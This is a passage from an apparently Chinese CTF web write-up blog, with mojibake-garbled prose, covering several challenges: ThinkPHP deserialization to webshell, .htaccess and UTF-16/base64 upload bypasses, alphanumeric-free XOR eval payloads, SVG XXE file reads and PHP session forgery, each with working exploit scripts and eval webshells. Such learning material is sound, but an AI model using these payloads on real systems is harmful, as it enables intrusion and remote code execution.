<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ªifå¯ä»¥ç›´æ¥passï¼Œç¬¬äºŒä¸ªifè¯­å¥å¦‚æœæˆ‘ä»¬ä¸ä¸Šä¼ æ–‡ä»¶ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ï¼Œç¬¬ä¸‰ä¸ªifç›´æ¥èµ‹å€¼ç»•è¿‡ï¼Œç„¶åå¯ä»¥æ„é€ å›¾ç‰‡é©¬ç»•è¿‡<code>getimagesize</code>çš„åˆ¤æ–­ï¼Œæ§åˆ¶<code>$this-&gt;filename</code>ä¸ºphpåç¼€å½¢å¼ï¼Œè¿™æ ·åˆ©ç”¨<code>copy($this-&gt;filename_tmp, $this-&gt;filename)</code>å°±å¯ä»¥å¤åˆ¶å‡ºäº†ä¸€ä¸ª php webshell äº†ã€‚</p>
<p>æ„é€ payloadçš„expï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$checker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = $checker;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp = <span class="string">&#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/00bf23e130fa1e525e332ff03dae345d.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">&#x27;./upload/adeee0c170ad4ffb110df0cde294aecd/shell.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $ext = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $except = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$register = <span class="keyword">new</span> Register(<span class="keyword">new</span> Profile());</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($register)));</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2FkZWVlMGMxNzBhZDRmZmIxMTBkZjBjZGUyOTRhZWNkLzAwYmYyM2UxMzBmYTFlNTI1ZTMzMmZmMDNkYWUzNDVkLnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvYWRlZWUwYzE3MGFkNGZmYjExMGRmMGNkZTI5NGFlY2Qvc2hlbGwucGhwIjtzOjM6ImV4dCI7YjoxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7YjowO30&#x3D;</span><br></pre></td></tr></table></figure>
<p>å¡«åˆ°cookieä¸­ï¼Œåˆ·æ–°é¡µé¢</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200724175540.png" alt=""></p>
<p>èšå‰‘è¿æ¥æ‹¿flagã€‚</p>
<h2 id="SUCTF2019-EasyWeb">SUCTF2019 EasyWeb</h2>
<h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3>
<ul>
<li>æ— å­—æ¯æ•°å­—webshell</li>
<li>æ–‡ä»¶ä¸Šä¼ </li>
<li>.htaccessåˆ©ç”¨</li>
</ul>
<h3 id="è§£é¢˜-v6">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å’Œæå®¢å¤§æŒ‘æˆ˜2019 RCE MEç±»ä¼¼çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?_&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥æˆåŠŸæ˜¾ç¤ºPHPINFOçš„ä¿¡æ¯ï¼Œæ³¨æ„å››ä¸ªç‚¹ï¼Œä¸€æ˜¯PHPç‰ˆæœ¬æ˜¯7.2ï¼ŒäºŒæ˜¯é¢˜ç›®çš„ç¯å¢ƒæ˜¯Apacheï¼Œä¸‰æ˜¯é™åˆ¶äº†open_basedirï¼Œæœ€åæ˜¯disable_functionã€‚</p>
<p>å†æ¥çœ‹get_the_flagå‡½æ•°ï¼ŒæŒ‰ç…§é¢˜æ„åº”è¯¥æ˜¯æƒ³è®©æˆ‘ä»¬é€šè¿‡è°ƒç”¨get_the_flagå‡½æ•°æ¥get shellï¼Œå‡½æ•°ä¸­æœ‰ä¸‰ä¸ªé™åˆ¶ï¼š</p>
<ul>
<li>æ–‡ä»¶å†…å®¹ä¸­ä¸èƒ½å‡ºç°<code>&lt;?</code></li>
<li>ä½¿ç”¨äº†exif_imagetypeæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯å›¾ç‰‡</li>
<li>åç¼€åä¸­ä¸å…è®¸å‡ºç°ph</li>
</ul>
<p>è¿™é‡Œçš„é™åˆ¶æ¡ä»¶å°±æœ‰ç‚¹åƒSUCTF2019 CheckInï¼Œä¸åŒçš„æ˜¯é‚£é“é¢˜çš„ç¯å¢ƒæ˜¯nginxï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ <code>.user.ini</code>æ¥ç»•è¿‡ã€‚é‚£ä¹ˆè¿™é“é¢˜å¦‚æœè¦é€šè¿‡ä¸Šä¼ <code>.htaccess</code>æ¥ç»•è¿‡åç¼€åçš„é™åˆ¶ï¼Œå°±éœ€è¦ç»•è¿‡<code>exif_imagetype</code>ï¼Œå¹¶ä¸”ä¸èƒ½ç”¨GIF89aç­‰æ–‡ä»¶å¤´ï¼Œå› ä¸ºè¿™æ ·è™½ç„¶èƒ½ä¸Šä¼ æˆåŠŸï¼Œä½†<code>.htaccess</code>æ–‡ä»¶æ— æ³•ç”Ÿæ•ˆã€‚è¿™æ—¶æœ‰ä¸¤ä¸ªåŠæ³•ï¼š</p>
<ul>
<li>
<p>åœ¨.htaccesså‰æ·»åŠ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure>
<p><code>#</code>åœ¨<code>.htaccess</code>æ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥<code>.htaccess</code>æ–‡ä»¶å¯ä»¥ç”Ÿæ•ˆ</p>
</li>
<li>
<p>åœ¨.<code>htaccess</code>å‰æ·»åŠ x00x00x8ax39x8ax39(è¦åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ·»åŠ ï¼Œæˆ–è€…ä½¿ç”¨pythonçš„bytesç±»å‹)<br>
x00x00x8ax39x8ax39 æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œ<code>.htaccess</code>ä¸­ä»¥0x00å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“<code>.htaccess</code></p>
</li>
</ul>
<p>æœ€åå°±éœ€è¦ç»•è¿‡<code>&lt;?</code>ï¼ŒåŒæ ·ä¹Ÿæœ‰ä¸¤ä¸ªåŠæ³•ï¼Œä¸è¿‡åªæ˜¯ç¼–ç çš„ä¸åŒè€Œå·²ï¼Œä¸€ç§æ˜¯base64ç¼–ç ï¼Œä¸€ç§æ˜¯uft-16ç¼–ç ï¼Œéƒ½æ¥äº†è§£ä¸€ä¸‹ã€‚</p>
<p>å…ˆæ¥çœ‹utf-16çš„ç¼–ç æ–¹å¼ï¼Œè¿™æ˜¯<code>.htaccess</code>æ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define width 1337                          # Define the width</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .cc         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥ç»•è¿‡çš„åŸå› å€Ÿç”¨ä¸€ä¸‹<a href="https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8">tr1pleå¸ˆå‚…çš„å›¾</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707153040.png" alt=""></p>
<p>ä¹Ÿå°±æ˜¯è¯´åŸæ¥æ˜¯utf-8ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—èŠ‚ï¼Œç°åœ¨utf-16æ˜¯ä¸¤ä¸ªå­—èŠ‚ç¼–ç ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆæ˜æ˜¾å¯ä»¥ç»•è¿‡å†…å®¹çš„è¿‡æ»¤ï¼Œexpï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Description : create and bypass file upload filter with .htaccess</span></span><br><span class="line"><span class="comment"># Author : Thibaud Robin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Will prove the file is a legit xbitmap file and the size is 1337x1337</span></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = open(filename, <span class="string">&#x27;wb&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .cc\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line">        </span><br><span class="line">generate_htacess()</span><br><span class="line">generate_php_file(<span class="string">&quot;shell.cc&quot;</span>, <span class="string">&quot;&lt;?php eval($_POST[&#x27;shell&#x27;]); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8bf8acd4-49c6-40c6-9bfe-688945f733ac.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span></span><br><span class="line">payload = &#123;&#125;</span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">htaccess_files = [</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>, open(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">]</span><br><span class="line">shell_files = [</span><br><span class="line">    (<span class="string">&#x27;file&#x27;</span>, open(<span class="string">&#x27;shell.cc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, files=htaccess_files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload, files=shell_files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<p>éªŒè¯ä¸€ä¸‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707163111.png" alt=""></p>
<p>ç”¨èšå‰‘è¿æ¥ï¼ŒåŠ è½½ç»•è¿‡<a href="https://github.com/Medicean/as_bypass_php_disable_functions">disable_functionçš„æ’ä»¶</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200707163432.png" alt=""></p>
<p>ç¬¬äºŒç§æ˜¯ç”¨base64ç¼–ç ç»•è¿‡</p>
<p>htaccessæ–‡ä»¶å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application&#x2F;x-httpd-php .cc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.cc&quot;</span><br></pre></td></tr></table></figure>
<p>shellçš„å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a12 &#x2F;&#x2F; 12ä¸ºäº†æ»¡è¶³base64ç®—æ³•å‡‘è¶³å…«ä¸ªå­—èŠ‚</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pPz4&#x3D;  &#x2F;&#x2F;&lt;?php @eval($_POST[cmd])?&gt;çš„base64ç¼–ç </span><br></pre></td></tr></table></figure>
<h3 id="æ‹“å±•">æ‹“å±•</h3>
<p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">.htaccess trickæ€»ç»“</a></p>
<p><a href="https://dy.163.com/article/ECQSCP9E0511CJ6O.html">PHP7ç»•è¿‡open_basedir</a></p>
<h2 id="BSidesCF2019-SVGMagic">BSidesCF2019 SVGMagic</h2>
<h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3>
<ul>
<li>
<p>SVGæ–‡ä»¶æ ¼å¼</p>
</li>
<li>
<p>XXEè¯»å–æ–‡ä»¶</p>
</li>
</ul>
<h3 id="è§£é¢˜-v7">è§£é¢˜</h3>
<p>å…ˆæ¥çœ‹çœ‹ä»€ä¹ˆæ˜¯SVGã€‚</p>
<p>SVG æ„ä¸ºå¯ç¼©æ”¾çŸ¢é‡å›¾å½¢ï¼ˆScalable Vector Graphicsï¼‰ï¼Œ <strong>ä½¿ç”¨ XML æ ¼å¼å®šä¹‰å›¾åƒ</strong>ã€‚</p>
<p>çœ‹ä¸€ä¸ªå®ä¾‹</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818205345.png" alt=""></p>
<p>ç”¨å¸¸è§„çš„XXEæ–‡ä»¶è¯»å–payload</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200818205431.png" alt=""></p>
<p>è¿™ä¸ªåœ°æ–¹æœ‰ä¸ªå‘å°±æ˜¯flagçš„æ–‡ä»¶ä½ç½®åœ¨å½“å‰ç›®å½•ï¼Œ<strong>è€Œ<code>proc/self/cwd</code>å°±ä»£è¡¨å½“å‰è·¯å¾„ã€‚</strong></p>
<h2 id="HFCTF2020-BabyUpload">HFCTF2020 BabyUpload</h2>
<h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3>
<ul>
<li>
<p>ä»£ç å®¡è®¡</p>
</li>
<li>
<p>sessionä¼ªé€ </p>
</li>
</ul>
<h3 id="è§£é¢˜-v8">è§£é¢˜</h3>
<p>å®¡è®¡æºç å¯ä»¥å‘ç°è¿™å‡ ä¸ªç‚¹</p>
<ul>
<li>sessionä¸­å­˜å‚¨äº†èº«ä»½ä¿¡æ¯ï¼Œé»˜è®¤äº‹guest</li>
<li>é€šè¿‡å‚æ•°å¯ä»¥ä¸Šä¼ æ–‡ä»¶å’Œä¸‹è½½æ–‡ä»¶</li>
</ul>
<p>æ—¢ç„¶è¿™æ ·ï¼Œé‚£æˆ‘ä»¬å°±å…ˆæŠŠsessionæ–‡ä»¶ä¸‹è½½ä¸‹æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆæ ·å­çš„ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200819190549.png" alt=""></p>
<p>åº”è¯¥æ˜¯ç”¨php_binaryæ–¹å¼åºåˆ—åŒ–çš„sessionã€‚</p>
<p>é‚£ä¹ˆç°åœ¨çš„æ€è·¯å°±æ˜¯ï¼š</p>
<p>ä¼ªé€ admin session --&gt; ä¸Šä¼ æ–°çš„sessæ–‡ä»¶ --&gt; å°†cookieæ”¹æˆsessæ–‡ä»¶sha256åŠ å¯†åçš„å­—ç¬¦ä¸²</p>
<p>ä½†æ˜¯ç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚æœç»•è¿‡å¯¹success.txtçš„åˆ¤æ–­ã€‚</p>
<p>ç”±äºæ–‡ä»¶åä¸å¯æ§ï¼Œæˆ‘ä»¬å°±æ— æ³•ä¸Šä¼ ä¸€ä¸ªåä¸ºsuccess.txtçš„æ–‡ä»¶ï¼Œä½†æ˜¯file_existså‡½æ•°çš„ä½œç”¨çš„æ˜¯<strong>æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨attråˆ›å»ºä¸€ä¸ªåä¸ºsuccess.txtçš„ç›®å½•å°±å¯ä»¥è¿‡è¿™ä¸ªåˆ¤æ–­ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://0abaf9de-86a1-4b6e-ab78-f008f607f2d5.node3.buuoj.cn&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;up_file&quot;</span>: (<span class="string">&quot;sess&quot;</span>, BytesIO(<span class="string">b&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;download&quot;</span>,</span><br><span class="line">        <span class="string">&quot;attr&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=url, data=data, files=files)</span><br><span class="line">    session_id = hashlib.sha256(<span class="string">&#x27;\x08usernames:5:&quot;admin&quot;;&#x27;</span>.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> session_id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_success</span>():</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;upload&quot;</span>,</span><br><span class="line">        <span class="string">&quot;attr&quot;</span>: <span class="string">&quot;success.txt&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;up_file&quot;</span>: (<span class="string">&quot;test&quot;</span>, BytesIO(<span class="string">b&#x27;good job!&#x27;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url, data=data, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upload_success()</span><br><span class="line">php_session_id = admin()</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: php_session_id</span><br><span class="line">&#125;</span><br><span class="line">s = requests.get(url)</span><br><span class="line">r = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<h2 id="HarekazeCTF2019-Avatar-Uploader-1">HarekazeCTF2019 Avatar Uploader 1</h2>
<h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3>
<ul>
<li>finfo_fileå‡½æ•°å’Œgetimagesizeå‡½æ•°çš„åŒºåˆ«</li>
</ul>
<h3 id="è§£é¢˜-v9">è§£é¢˜</h3>
<p>åŸé¢˜æ˜¯ç»™äº†æºç ã€‚</p>
<p>å…³é”®ä»£ç æ˜¯åœ¨upload.phpä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// check file type</span></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line"><span class="keyword">if</span> (!in_array($type, [<span class="string">&#x27;image/png&#x27;</span>])) &#123;</span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;Uploaded file is not PNG format.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file width/height</span></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">0</span>] &gt; <span class="number">256</span> || $size[<span class="number">1</span>] &gt; <span class="number">256</span>) &#123;</span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;Uploaded image is too large.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">2</span>] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  <span class="comment">// I hope this never happens...</span></span><br><span class="line">  <span class="built_in">error</span>(<span class="string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="string">&#x27;FLAG1&#x27;</span>) . <span class="string">&#x27;&lt;/code&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæˆ‘ä»¬å¾—äº†è§£PHPæ–‡ä»¶å¤´æ ¼å¼æ˜¯ä»€ä¹ˆæ ·çš„</p>
<p><a href="https://blog.csdn.net/u013943420/article/details/76855416">https://blog.csdn.net/u013943420/article/details/76855416</a></p>
